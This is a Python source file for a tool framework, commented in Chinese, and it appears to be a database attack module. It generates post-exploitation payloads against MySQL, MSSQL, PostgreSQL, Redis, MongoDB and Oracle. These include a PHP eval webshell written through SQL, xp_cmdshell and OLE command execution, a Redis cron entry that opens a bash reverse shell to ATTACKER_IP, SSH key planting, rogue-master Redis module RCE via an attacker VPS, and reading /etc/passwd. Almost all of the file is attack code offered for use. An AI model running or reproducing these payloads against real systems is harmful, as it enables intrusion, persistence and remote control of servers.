# tools/db_attacks.py
"""
数据库攻击模块

支持:
- MySQL: UDF提权、写Webshell、读文件
- MSSQL: xp_cmdshell、CLR执行、写文件
- PostgreSQL: 大对象写文件、COPY写文件
- Redis: 写cron、写SSH key、主从复制RCE
- MongoDB: 未授权访问、JS执行
- Oracle: Java执行、UTL_HTTP SSRF
"""

import os
import json
import base64
import socket
import subprocess
from typing import Dict, List, Any, Optional
from dataclasses import dataclass
from tool_framework import CommandLineTool


@dataclass
class DBConnection:
    """数据库连接信息"""
    host: str
    port: int
    username: str = ""
    password: str = ""
    database: str = ""
    timeout: int = 30


class DatabaseAttacker(CommandLineTool):
    """
    数据库攻击工具集

    支持多种数据库的攻击方法：
    - 命令执行
    - 文件读写
    - 权限提升
    """

    def __init__(self):
        super().__init__("python3")
        self.timeout = 60

    def name(self) -> str:
        return "db-attacks"

    def description(self) -> str:
        return "数据库攻击工具，支持MySQL/MSSQL/PostgreSQL/Redis/MongoDB/Oracle的提权和命令执行。"

    def supported_vulns(self) -> list:
        return [
            "MySQL UDF", "MySQL Webshell", "MSSQL xp_cmdshell",
            "PostgreSQL RCE", "Redis RCE", "MongoDB Unauthorized",
            "Oracle Java Execution"
        ]

    def check_available(self) -> bool:
        return True

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "action": {
                "type": "str",
                "description": "攻击动作: mysql_udf/mysql_webshell/mssql_cmd/redis_cron/redis_sshkey/redis_rce/mongo_check",
                "required": True
            },
            "host": {
                "type": "str",
                "description": "目标主机IP",
                "required": True
            },
            "port": {
                "type": "int",
                "description": "目标端口",
                "required": False
            },
            "username": {
                "type": "str",
                "description": "用户名",
                "required": False
            },
            "password": {
                "type": "str",
                "description": "密码",
                "required": False
            },
            "command": {
                "type": "str",
                "description": "要执行的命令",
                "required": False
            },
            "file_path": {
                "type": "str",
                "description": "文件路径",
                "required": False
            },
            "content": {
                "type": "str",
                "description": "文件内容",
                "required": False
            }
        }

    def execute(self, target: str, params: Dict) -> Dict:
        """执行数据库攻击"""
        action = params.get("action", "")
        host = params.get("host") or target
        port = params.get("port")
        username = params.get("username", "")
        password = params.get("password", "")

        if not host:
            return {"error": "必须提供目标主机", "success": False}

        # 根据action分发
        action_map = {
            "mysql_udf": self._mysql_udf_escalation,
            "mysql_webshell": self._mysql_write_webshell,
            "mysql_read": self._mysql_read_file,
            "mssql_cmd": self._mssql_xp_cmdshell,
            "mssql_clr": self._mssql_clr_execution,
            "postgres_write": self._postgres_write_file,
            "redis_cron": self._redis_write_cron,
            "redis_sshkey": self._redis_write_sshkey,
            "redis_rce": self._redis_slave_rce,
            "redis_module": self._redis_module_load,
            "mongo_check": self._mongo_unauthorized,
            "mongo_exec": self._mongo_execute_js,
            "oracle_java": self._oracle_java_execution,
        }

        if action not in action_map:
            return {"error": f"未知动作: {action}", "success": False}

        # 构建连接信息
        conn = DBConnection(
            host=host,
            port=port or self._get_default_port(action),
            username=username,
            password=password
        )

        try:
            return action_map[action](conn, params)
        except Exception as e:
            return {"error": str(e), "success": False}

    def _get_default_port(self, action: str) -> int:
        """获取默认端口"""
        port_map = {
            "mysql": 3306,
            "mssql": 1433,
            "postgres": 5432,
            "redis": 6379,
            "mongo": 27017,
            "oracle": 1521,
        }
        for db, port in port_map.items():
            if db in action:
                return port
        return 3306

    # =========================================================================
    # MySQL 攻击方法
    # =========================================================================

    def _mysql_udf_escalation(self, conn: DBConnection, params: Dict) -> Dict:
        """
        MySQL UDF提权

        原理：
        1. 上传包含自定义函数的.so/.dll文件
        2. 创建自定义函数
        3. 通过函数执行系统命令
        """
        command = params.get("command", "id")

        # 检测系统类型
        system_type = params.get("system", "linux")

        # UDF库路径
        if system_type == "windows":
            lib_name = "lib_mysqludf_sys.dll"
        else:
            lib_name = "lib_mysqludf_sys.so"

        sql_commands = f"""
-- 检查plugin目录
SHOW VARIABLES LIKE 'plugin_dir';

-- 创建UDF函数表
CREATE TABLE IF NOT EXISTS mysql.udf (line BLOB);

-- 写入UDF库（需要lib文件）
-- 这里假设已经有lib文件

-- 创建sys_eval函数
CREATE FUNCTION sys_eval RETURNS STRING SONAME '{lib_name}';

-- 执行命令
SELECT sys_eval('{command}');
"""

        return {
            "action": "mysql_udf_escalation",
            "host": conn.host,
            "port": conn.port,
            "command": command,
            "sql_template": sql_commands,
            "prerequisites": [
                "需要MySQL root权限或FILE权限",
                f"需要上传UDF库文件: {lib_name}",
                "plugin目录需要可写"
            ],
            "manual_steps": [
                f"1. 获取UDF库文件（sqlmap或metasploit自带）",
                f"2. 上传到MySQL plugin目录",
                f"3. 执行上述SQL创建函数",
                f"4. 调用sys_eval执行命令"
            ],
            "success": None,
            "note": "需要手动执行SQL，建议使用MySQL客户端连接后操作"
        }

    def _mysql_write_webshell(self, conn: DBConnection, params: Dict) -> Dict:
        """
        MySQL写Webshell

        方法：
        1. SELECT ... INTO OUTFILE
        2. 利用general_log
        """
        webroot = params.get("webroot", "/var/www/html")
        shell_name = params.get("shell_name", "shell.php")
        shell_content = params.get("content", "<?php @eval($_POST['cmd']);?>")

        shell_path = f"{webroot}/{shell_name}"

        # 方法1: INTO OUTFILE
        sql_outfile = f"""
SELECT '{shell_content}' INTO OUTFILE '{shell_path}';
"""

        # 方法2: general_log
        sql_log = f"""
SET global general_log = ON;
SET global general_log_file = '{shell_path}';
SELECT '<?php @eval($_POST[cmd]);?>';
SET global general_log = OFF;
"""

        return {
            "action": "mysql_write_webshell",
            "host": conn.host,
            "port": conn.port,
            "shell_path": shell_path,
            "sql_outfile": sql_outfile,
            "sql_general_log": sql_log,
            "prerequisites": [
                "需要MySQL root权限或FILE权限",
                "需要知道Web根目录路径",
                "MySQL用户需要对目标目录有写权限"
            ],
            "success": None,
            "note": "如果secure_file_priv限制，尝试使用general_log方法"
        }

    def _mysql_read_file(self, conn: DBConnection, params: Dict) -> Dict:
        """MySQL读取文件"""
        file_path = params.get("file_path", "/etc/passwd")

        sql = f"""
SELECT LOAD_FILE('{file_path}');
"""

        return {
            "action": "mysql_read_file",
            "host": conn.host,
            "port": conn.port,
            "file_path": file_path,
            "sql": sql,
            "prerequisites": [
                "需要FILE权限",
                "文件必须可被MySQL用户读取"
            ],
            "success": None
        }

    # =========================================================================
    # MSSQL 攻击方法
    # =========================================================================

    def _mssql_xp_cmdshell(self, conn: DBConnection, params: Dict) -> Dict:
        """
        MSSQL xp_cmdshell命令执行

        原理：
        利用SQL Server的xp_cmdshell扩展存储过程执行系统命令
        """
        command = params.get("command", "whoami")

        sql_commands = f"""
-- 启用xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- 执行命令
EXEC xp_cmdshell '{command}';

-- 关闭xp_cmdshell（可选）
-- EXEC sp_configure 'xp_cmdshell', 0;
-- RECONFIGURE;
"""

        # 如果xp_cmdshell被删除，使用sp_OACreate
        sql_oacreate = f"""
-- 启用OLE自动化
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;

-- 使用sp_OACreate执行命令
DECLARE @result INT;
DECLARE @cmd VARCHAR(255);
SET @cmd = 'cmd /c {command}';
EXEC @result = master..sp_OACreate 'WScript.Shell', @cmd, 0;
"""

        return {
            "action": "mssql_xp_cmdshell",
            "host": conn.host,
            "port": conn.port,
            "command": command,
            "sql_xp_cmdshell": sql_commands,
            "sql_sp_oacreate": sql_oacreate,
            "connection_string": f"impacket-mssqlclient {conn.username}:{conn.password}@{conn.host}",
            "prerequisites": [
                "需要sysadmin或足够权限",
                "xp_cmdshell需要被启用"
            ],
            "success": None
        }

    def _mssql_clr_execution(self, conn: DBConnection, params: Dict) -> Dict:
        """
        MSSQL CLR执行

        原理：
        通过加载自定义CLR程序集执行代码
        """
        command = params.get("command", "whoami")

        sql_commands = f"""
-- 启用CLR
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'clr enabled', 1;
RECONFIGURE;

-- 创建程序集（需要先有DLL）
CREATE ASSEMBLY [MyAssembly] FROM 'path/to/dll';

-- 创建存储过程
CREATE PROCEDURE [dbo].[ExecCommand]
    @cmd NVARCHAR(MAX)
AS EXTERNAL NAME [MyAssembly].[StoredProcedures].[ExecCommand];

-- 执行
EXEC ExecCommand '{command}';
"""

        return {
            "action": "mssql_clr_execution",
            "host": conn.host,
            "port": conn.port,
            "command": command,
            "sql_template": sql_commands,
            "prerequisites": [
                "需要sysadmin权限",
                "需要创建自定义CLR DLL",
                "CLR需要被启用"
            ],
            "success": None
        }

    # =========================================================================
    # PostgreSQL 攻击方法
    # =========================================================================

    def _postgres_write_file(self, conn: DBConnection, params: Dict) -> Dict:
        """
        PostgreSQL写文件

        方法：
        1. 大对象(LO)写入
        2. COPY命令写入
        """
        file_path = params.get("file_path", "/tmp/test.txt")
        content = params.get("content", "test content")

        # 方法1: 大对象
        sql_lo = f"""
-- 创建大对象
SELECT lo_from_bytea(0, '{content}'::bytea);

-- 导出文件（需要superuser）
SELECT lo_export((SELECT oid FROM pg_largeobject_metadata ORDER BY oid DESC LIMIT 1), '{file_path}');
"""

        # 方法2: COPY（PostgreSQL 8.1+）
        sql_copy = f"""
-- 创建临时表
CREATE TABLE temp_table (data TEXT);

-- 插入数据
INSERT INTO temp_table VALUES ('{content}');

-- 复制到文件
COPY temp_table TO '{file_path}';

-- 清理
DROP TABLE temp_table;
"""

        return {
            "action": "postgres_write_file",
            "host": conn.host,
            "port": conn.port,
            "file_path": file_path,
            "sql_lo": sql_lo,
            "sql_copy": sql_copy,
            "connection_string": f"psql -h {conn.host} -p {conn.port} -U {conn.username}",
            "prerequisites": [
                "需要superuser权限",
                "目标目录可写"
            ],
            "success": None
        }

    # =========================================================================
    # Redis 攻击方法
    # =========================================================================

    def _redis_write_cron(self, conn: DBConnection, params: Dict) -> Dict:
        """
        Redis写crontab

        原理：
        将cron任务写入/var/spool/cron/crontabs/
        """
        cron_content = params.get("content", "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
        cron_path = "/var/spool/cron/crontabs/root"

        # 构造Redis命令
        redis_commands = f"""
CONFIG SET dir /var/spool/cron/crontabs/
CONFIG SET dbfilename root
SET x "\\n\\n{cron_content}\\n\\n"
SAVE
"""

        return {
            "action": "redis_write_cron",
            "host": conn.host,
            "port": conn.port or 6379,
            "cron_content": cron_content,
            "redis_commands": redis_commands,
            "cli_command": f"redis-cli -h {conn.host} -p {conn.port or 6379}",
            "prerequisites": [
                "Redis无密码或已知密码",
                "Redis以root运行",
                "/var/spool/cron可写"
            ],
            "success": None
        }

    def _redis_write_sshkey(self, conn: DBConnection, params: Dict) -> Dict:
        """
        Redis写SSH公钥

        原理：
        将公钥写入/root/.ssh/authorized_keys
        """
        public_key = params.get("content", "ssh-rsa AAAA... root@kali")
        ssh_path = "/root/.ssh"

        redis_commands = f"""
CONFIG SET dir /root/.ssh/
CONFIG SET dbfilename authorized_keys
SET x "\\n\\n{public_key}\\n\\n"
SAVE
"""

        return {
            "action": "redis_write_sshkey",
            "host": conn.host,
            "port": conn.port or 6379,
            "public_key": public_key,
            "redis_commands": redis_commands,
            "cli_command": f"redis-cli -h {conn.host} -p {conn.port or 6379}",
            "prerequisites": [
                "Redis无密码或已知密码",
                "Redis以root运行",
                "/root/.ssh目录存在或可创建"
            ],
            "success": None
        }

    def _redis_slave_rce(self, conn: DBConnection, params: Dict) -> Dict:
        """
        Redis主从复制RCE

        原理：
        通过伪造Redis主节点，加载恶意.so模块执行命令
        """
        attacker_ip = params.get("attacker_ip", "YOUR_VPS_IP")
        module_name = params.get("module", "exp.so")

        # 步骤说明
        steps = [
            f"1. 在攻击机上启动伪造Redis主节点（使用rogue-server.py）",
            f"2. 连接目标Redis: redis-cli -h {conn.host} -p {conn.port or 6379}",
            f"3. 设置从节点: SLAVEOF {attacker_ip} 6379",
            f"4. 设置模块名: CONFIG SET dbfilename {module_name}",
            f"5. 完成同步后执行: MODULE LOAD /var/lib/redis/{module_name}",
            f"6. 执行命令: system.exec 'whoami'",
        ]

        return {
            "action": "redis_slave_rce",
            "host": conn.host,
            "port": conn.port or 6379,
            "attacker_ip": attacker_ip,
            "module_name": module_name,
            "steps": steps,
            "tools_needed": [
                "rogue-server.py（Redis主从复制攻击脚本）",
                "恶意.so模块（如exp.so、module.so）"
            ],
            "prerequisites": [
                "Redis 4.x-5.x（支持MODULE LOAD）",
                "Redis无密码或已知密码",
                "有可写入的目录"
            ],
            "success": None
        }

    def _redis_module_load(self, conn: DBConnection, params: Dict) -> Dict:
        """
        Redis加载模块执行命令

        前提：已有恶意.so模块在目标服务器
        """
        module_path = params.get("module_path", "/tmp/exp.so")
        command = params.get("command", "id")

        redis_commands = f"""
MODULE LOAD {module_path}
system.exec '{command}'
"""

        return {
            "action": "redis_module_load",
            "host": conn.host,
            "port": conn.port or 6379,
            "module_path": module_path,
            "command": command,
            "redis_commands": redis_commands,
            "cli_command": f"redis-cli -h {conn.host} -p {conn.port or 6379}",
            "prerequisites": [
                "Redis 4.x+（支持MODULE）",
                "恶意模块已上传到目标",
            ],
            "success": None
        }

    # =========================================================================
    # MongoDB 攻击方法
    # =========================================================================

    def _mongo_unauthorized(self, conn: DBConnection, params: Dict) -> Dict:
        """
        MongoDB未授权访问检测
        """
        host = conn.host
        port = conn.port or 27017

        # 尝试连接
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))

            # 发送MongoDB握手
            import struct
            msg = b'\x00\x00\x00\x00'  # 简单的探测

            sock.send(struct.pack('<I', 16 + len(msg)) + b'\x00\x00\x00\x00' + msg)
            response = sock.recv(4096)
            sock.close()

            if response:
                return {
                    "action": "mongo_unauthorized",
                    "host": host,
                    "port": port,
                    "vulnerable": True,
                    "evidence": "MongoDB端口可访问，可能存在未授权访问",
                    "cli_command": f"mongo --host {host} --port {port}",
                    "recommended_actions": [
                        "连接后执行: show dbs",
                        "查看敏感数据: db.users.find()",
                    ],
                    "success": True
                }
        except Exception as e:
            return {
                "action": "mongo_unauthorized",
                "host": host,
                "port": port,
                "vulnerable": False,
                "error": str(e),
                "success": False
            }

        return {"action": "mongo_unauthorized", "success": False}

    def _mongo_execute_js(self, conn: DBConnection, params: Dict) -> Dict:
        """
        MongoDB执行JavaScript
        """
        js_code = params.get("content", "db.version()")

        # 通过$where执行JS
        query = f'db.collection.find({{"$where": "{js_code}"}})'

        return {
            "action": "mongo_execute_js",
            "host": conn.host,
            "port": conn.port or 27017,
            "js_code": js_code,
            "query": query,
            "cli_command": f"mongo --host {conn.host} --port {conn.port or 27017} --eval '{query}'",
            "note": "MongoDB 4.2+默认禁用$where的JS执行",
            "success": None
        }

    # =========================================================================
    # Oracle 攻击方法
    # =========================================================================

    def _oracle_java_execution(self, conn: DBConnection, params: Dict) -> Dict:
        """
        Oracle Java存储过程执行命令
        """
        command = params.get("command", "whoami")

        sql_commands = f"""
-- 创建Java类
CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "cmd" AS
import java.lang.*;
import java.io.*;
public class cmd {{
    public static void exec(String command) throws IOException {{
        Runtime.getRuntime().exec(command);
    }}
}};

-- 创建存储过程
CREATE OR REPLACE PROCEDURE cmd_exec(p_command IN VARCHAR2)
AS LANGUAGE JAVA
NAME 'cmd.exec(java.lang.String)';

-- 执行
EXEC cmd_exec('{command}');
"""

        return {
            "action": "oracle_java_execution",
            "host": conn.host,
            "port": conn.port or 1521,
            "command": command,
            "sql_template": sql_commands,
            "connection_string": f"sqlplus {conn.username}/{conn.password}@{conn.host}:{conn.port or 1521}/orcl",
            "prerequisites": [
                "需要Java权限",
                "需要CREATE PROCEDURE权限",
            ],
            "success": None
        }


# 便捷函数，供其他模块调用
def attack_mysql(host: str, port: int, username: str, password: str,
                 action: str, **kwargs) -> Dict:
    """MySQL攻击快捷函数"""
    attacker = DatabaseAttacker()
    params = {
        "action": f"mysql_{action}",
        "host": host,
        "port": port,
        "username": username,
        "password": password,
        **kwargs
    }
    return attacker.execute(host, params)


def attack_redis(host: str, port: int, action: str, **kwargs) -> Dict:
    """Redis攻击快捷函数"""
    attacker = DatabaseAttacker()
    params = {
        "action": f"redis_{action}",
        "host": host,
        "port": port,
        **kwargs
    }
    return attacker.execute(host, params)


def attack_mssql(host: str, port: int, username: str, password: str,
                 action: str, **kwargs) -> Dict:
    """MSSQL攻击快捷函数"""
    attacker = DatabaseAttacker()
    params = {
        "action": f"mssql_{action}",
        "host": host,
        "port": port,
        "username": username,
        "password": password,
        **kwargs
    }
    return attacker.execute(host, params)


# 注册工具
def register():
    """注册数据库攻击工具"""
    from tool_framework import ToolRegistry
    ToolRegistry.register(DatabaseAttacker())